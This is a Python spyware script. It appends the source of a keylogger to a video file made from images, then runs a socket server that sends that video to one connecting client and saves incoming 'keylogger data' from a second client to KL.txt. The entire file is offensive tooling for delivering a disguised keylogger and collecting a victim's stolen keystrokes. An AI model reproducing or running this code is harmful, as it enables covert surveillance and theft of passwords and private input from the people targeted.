
#------Steganography is the method of hiding secret data in any image/audio/video.

# -----------------pip install pillow
#------------------install required pyxhook
# use python3 to run the script ---python3 spyware.py

import cv2
import numpy as np
import glob
import socket

#thread
def threaded1(c): 
	
	filename='./Video_with_Keylogger.avi'
	f = open(filename,'rb')
	l = f.read(1024)
	while (l):
	   c.send(l)
	   print('Sent ',repr(l))
	   l = f.read(1024)
	f.close()
	print('Done sending ')
	#c.send("DONE")

	c.close()
	
	
def threaded2(c): 
	
	with open('KL.txt', 'wb') as f:
	    #print ('file opened')
	    print('receiving keylogger data...')
	    while True:
		data = c.recv(1024)
		print('data=%s', (data))
		if not data:
		    break
		# write data to a file
		f.write(data)
	f.close()
	c.close()


#--------------------------------------------
##Create a video with keylogger
 
img_array = []
for filename in glob.glob('./images/*.jpg'):
    img = cv2.imread(filename)
    height, width, layers = img.shape
    size = (width,height)
    img_array.append(img)
    
 
out = cv2.VideoWriter('Video_with_Keylogger.avi',cv2.VideoWriter_fourcc(*'DIVX'), 0.5, size)

for i in range(len(img_array)):
    out.write(img_array[i])
out.release()

###Appending a delimiter

variable = "****////"
with open('./Video_with_Keylogger.avi', 'a') as wfile:
   wfile.write(variable)
cap = cv2.VideoCapture('./Video_with_Keylogger.avi')

### Appending the keylogger code
f = open("keylogger.py","r")
pgm = f.read()
with open('./Video_with_Keylogger.avi', 'a') as wfile:
   wfile.write(pgm)
cap = cv2.VideoCapture('./Video_with_Keylogger.avi')
success, frame = cap.read()

############################################################
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)		 
print ("Socket successfully created")
s.setsockopt( socket.SOL_SOCKET, socket.SO_REUSEADDR , 1)
s.setblocking(0)
s.settimeout(125)
#Any port number
port = 1234				

s.bind(('', port))		 
print ("socket binded to %s" %(port)) 

# socket into listening mode 
s.listen(20)	 
print ("socket is listening")
count =0
while True: 
	
	# Establish connection with client. 
	if(count==0):
		c1, (ip,port) = s.accept()	 
		print ('Got connection from', str(ip) + str(port))
		count=count+1
		threaded1(c1)
	else:
		c2, (ip,port) = s.accept()	 
		print ('Got connection from', str(ip) + str(port))
		count=count+1
		threaded2(c2)
	if(count>=2):
		break
	
	
s.shutdown(1)
s.close()








